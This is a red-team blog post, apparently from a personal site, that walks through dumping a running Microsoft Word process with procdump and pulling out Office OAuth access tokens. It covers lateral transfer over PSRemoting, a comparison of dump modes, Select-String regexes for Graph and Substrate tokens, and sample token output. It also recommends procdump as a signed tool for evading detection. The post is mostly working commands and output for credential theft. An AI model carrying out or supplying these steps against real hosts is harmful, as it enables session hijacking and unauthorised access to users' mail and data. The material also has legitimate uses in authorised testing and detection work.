---
title: Stealing office tokens in memory
date: 2023-01-12 09:48:47 +07:00
categories: RedTeaming
#modified: 20-08-29 09:24:47 +07:00
#tags: [blog, netlify, jekyll, github]
description: Stealing Microsoft office tokens in memory
#thumbnail: "https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/redteaming/Paces_Review/lab.png"
#image: "https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/redteaming/Paces_Review/lab.png"
---

Let us look into stealing office tokens present in memory on a host for a target pricipal. 

To simulate an Office login on the host using the a target user, a Macro command executing tool such as MacroRecorder was used to automate the log in process: https://www.macrorecorder.com/

```
& 'C:\Program Files (x86)\MacroRecorder\MacroRecorder.exe' -play=C:C:\Users\Administrator\Desktop\macro.mrf
```

Attempting to analyze and search for office tokens (`eyJ0eX`) using Process Hacker 2 after a valid login,  consistent results after a user simulation action are observed:

![](Pasted%20image%2020230925124733.png)

However when performing a minidump of the process and then looking for this string results were inconsistent, this is primarily because minidumps using say procdump do not include Private mapped regions. As an alternative we can perform a Full process memory dump or alternative dumps that can dump private mapped regions too.

To do so we can use a tool such as [procdump](https://learn.microsoft.com/en-us/sysinternals/downloads/procdump) as it is a trusted signed tool to evade detections.

After performing various procdump dumps with the working MacroRecorder simulation for the HTTPS interception part and looking for tokens with the string `eyJ0eX` the following results were observed:

**Perform a standard minidump (default)**: `-mm`
- Credentials: Rarely found
- Size: ~50mb

**Performing a full process dump**: `-ma `
- Credentials: Found always
- Size: ~650mb

**Performing miniplus dump**: `-mp` (preferred)
- Credentials: Found always, similar to full process dump 
- Size: ~95mb

Now, create a PSRemote session on the target as in objective and transfer procdump.

```
PS C:\> $session = New-PSSession -cn WIN-JH5F00D8313.nerd.corp

PS C:\> Copy-Item C:\Tools\procdump.exe -Destination C:\Users\public\ -ToSession $session -recurse
```

An example to perform a miniplus dump using procdump is as follows:

```
[WIN-JH5F00D8313.nerd.corp]: PS C:\Users\Administrator> tasklist /v | findstr /i winword
WINWORD.EXE                   3396 RDP-Tcp#0                  2    196,988 K Running         EC2AMAZ-2LLTT7D\Administrator                           0:00:05 Document1  -  AutoRecovered  -  Compatibility Mode - Word

[WIN-JH5F00D8313.nerd.corp]: PS C:\Users\Administrator> .\procdump.exe -mp 3396

ProcDump v11.0 - Sysinternals process dump utility
Copyright (C) 2009-2022 Mark Russinovich and Andrew Richards
Sysinternals - www.sysinternals.com

[07:05:01] Dump 1 initiated: C:\Users\Administrator\Desktop\ca\ProcDump\WINWORD.EXE_230925_070501.dmp
[07:05:02] Dump 1 complete: 97 MB written in 0.5 seconds
[07:05:02] Dump count reached.
```

We can then search for office tokens by looking for the string `eyJ0eX` using the `select-string` commandlet in PowerShell or Microsofts [strings64](https://learn.microsoft.com/en-us/sysinternals/downloads/strings) tool:

Using `select-string` in PowerShell (preferred) we look for a token with `graph.microsoft.com` and `outlook.office365.com`. In this case first for `graph.microsoft.com`

*Regex NOTE:
. is escaped as \. because . is a special character in regular expressions and we want to match a literal dot.
.\*? matches any characters (including spaces) in between "graph.microsoft.com" and "eyJ0eX" on the same line.*

```
[WIN-JH5F00D8313.nerd.corp]: PS C:\Users\Administrator> $graphtoken = Select-String -Path C:\Users\Administrator\Desktop\ca\ProcDump\WINWORD.EXE_231003_070025.dmp -Pattern "graph\.microsoft\.com.*?eyJ0eX"

[WIN-JH5F00D8313.nerd.corp]: PS C:\Users\Administrator> $graphtoken | out-file -append -encoding ascii graphtoken.out

[WIN-JH5F00D8313.nerd.corp]: PS C:\Users\Administrator> gc graphtoken.out
[....snip...]
https://graph.microsoft.com//Users.Read":{"cachedl`�#4◄�15.0000ft Office Word2292ab01c","
credential_type":"AccessToken","environment":"login.windows.net","expires_on":"1695710790","extended_expires_on":"16956
24392","family_id":"","home_account_id":"52f19b5b-0567-4043-8ffe-48b00f43203d.e37fb390-11d6-47ac-9b5b-b853810a8411","ki
d":"","prt_protocol_version":"","realm":"e37fb390-11d6-47ac-9b5b-b853810a8411","redirect_uri":"urn:ietf:wg:oauth:2.0:oo
b","refresh_on":"0","requested_claims":"{\"access_token\":{\"xms_cc\":{\"values\":[\"CP1\"]}}}","secret":"eyJ0eXAiOi[...snip...]","session_key":"","session_key_rolling_date":"0","target":"email

[...snip...]
```

Copy and decode the token at `https://jwt.io/` as follows:

![](Pasted%20image%2020231003124256.png)

Similarly, here's an example for `substrate.office.com`:

```
[WIN-JH5F00D8313.nerd.corp]: PS C:\Users\Administrator> $substratetoken = Select-String -Path C:\Users\Administrator\Desktop\ca\ProcDump\WINWORD.EXE_231003_151238.dmp -Pattern "substrate\.office\.com.*?eyJ0eX"

[WIN-JH5F00D8313.nerd.corp]: PS C:\Users\Administrator> $substratetoken | out-file -append -encoding ascii substratetoken.out

[WIN-JH5F00D8313.nerd.corp]: PS C:\Users\Administrator> gc substratetoken.out

https://substrate.office.com/User.Read https://substrate.office.com/UnifiedPolicy.User.Read
https://substrate.office.com/user_impersonation https://substrate.office.com/User-Internal.Read":{"cached_at":"16956244
01","client_id":"d3590ed6-52b3-4102-aeff-aad2292ab01c","credential_type":"AccessToken","environment":"login.windows.net
","expires_on":"1695724282","extended_expires_on":"1695624401","family_id":"","home_account_id":"52f19b5b-0567-4043-8ff
e-48b00f43203d.e37fb390-11d6-47ac-9b5b-b853810a8411","kid":"","prt_protocol_version":"","realm":"e37fb390-11d6-47ac-9b5
b-b853810a8411","redirect_uri":"urn:ietf:wg:oauth:2.0:oob","refresh_on":"0","requested_claims":"{\"access_token\":{\"xm
s_cc\":{\"values\":[\"CP1\"]}}}","secret":"eyJ0eXAiOiJKV1QiLCJub[...snip...]
QlmDfx5owE3HTj_rmkOxTXFjDNkbWm1zFouA","session_key":"","session_key_rolling_date":"0","target":"https://substrate.offic
e.com/Collab-Internal.Write https://substrate.office.com/Notes.ReadWrite
```

## References

https://mrd0x.com/stealing-tokens-from-office-applications/
